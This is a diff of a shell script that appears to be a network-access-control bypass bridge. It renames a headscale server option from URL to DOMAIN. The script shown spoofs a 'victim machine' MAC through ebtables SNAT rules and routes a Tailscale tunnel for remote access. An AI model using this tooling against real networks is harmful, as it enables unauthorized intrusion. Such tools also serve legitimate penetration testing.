@@ -32,7 +32,7 @@ BRIP=169.254.66.66 # IP address for the bridge
 BRGW=169.254.66.1 # Gateway IP address for the bridge
 
 SIDE="" # sidechannel interface (optional, e.g., usb0)
-URL="" # URL of headscale server (optional)
+DOMAIN="" # DOMAIN of headscale server (optional)
 TS=tailscale0 # Tailscale interface (optional)
 TS_SUBNET=100.64.0.0/10 # Tailscale subnet (optional)
 
@@ -75,7 +75,7 @@ Usage() {
   echo "    -1 <eth>    network interface plugged into switch"
   echo "    -2 <eth>    network interface plugged into victim machine"
   echo "    -3 <eth>    network interface for sidechannel communication (optional, e.g., usb0)"
-  echo "    -u <url>    URL of headscale server (optional, e.g., https://headscale.example.com)"
+  echo "    -d <domain>    domain of headscale server (optional, e.g., headscale.example.com)"
   echo "    -a          autonomous mode"
   echo "    -c          start connection setup only"
   echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
@@ -94,7 +94,7 @@ Version() {
 
 ## Check if we got all needed parameters
 CheckParams() {
-  while getopts ":1:2:3:u:acg:hirR" opts
+  while getopts ":1:2:3:d:acg:hirR" opts
     do
       case "$opts" in
         "1")
@@ -106,8 +106,8 @@ CheckParams() {
         "3")
           SIDE=$OPTARG
           ;;
-        "u")
-          URL=$OPTARG
+        "d")
+          DOMAIN=$OPTARG
           ;;
         "a")
           OPTION_AUTONOMOUS=1
@@ -274,18 +274,18 @@ ConnectionSetup() {
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC
 
-    if [ -n "$URL" ]; then
-        URL_IP=`getent hosts $URL | awk '{ print $1 }'`
-        if [ -z "$URL_IP" ]; then
-            error_exit "Failed to resolve URL: $URL"
+    if [ -n "$DOMAIN" ]; then
+        DOMAIN_IP=`getent hosts $DOMAIN | awk '{ print $1 }'`
+        if [ -z "$DOMAIN_IP" ]; then
+            error_exit "Failed to resolve DOMAIN: $DOMAIN"
         fi
-        echo "$URL_IP    $URL" >> /etc/hosts
+        echo "$DOMAIN_IP    $DOMAIN" >> /etc/hosts
     fi
 
-    if [ -n "$URL_IP" ] && [ -n "$SIDE" ]; then
+    if [ -n "$DOMAIN_IP" ] && [ -n "$SIDE" ]; then
       SIDE_DEFAULT_GW=$(ip route | awk '/default/ && $5 == "'"$SIDE"'" {print $3; exit}')
       if [ -n "$SIDE_DEFAULT_GW" ]; then
-        route add $URL_IP via $SIDE_DEFAULT_GW dev $SIDE
+        route add $DOMAIN_IP via $SIDE_DEFAULT_GW dev $SIDE
         route add $TS_SUBNET dev $TS
       else
         echo "Warning: Could not determine default gateway for interface $SIDE. Route not added."
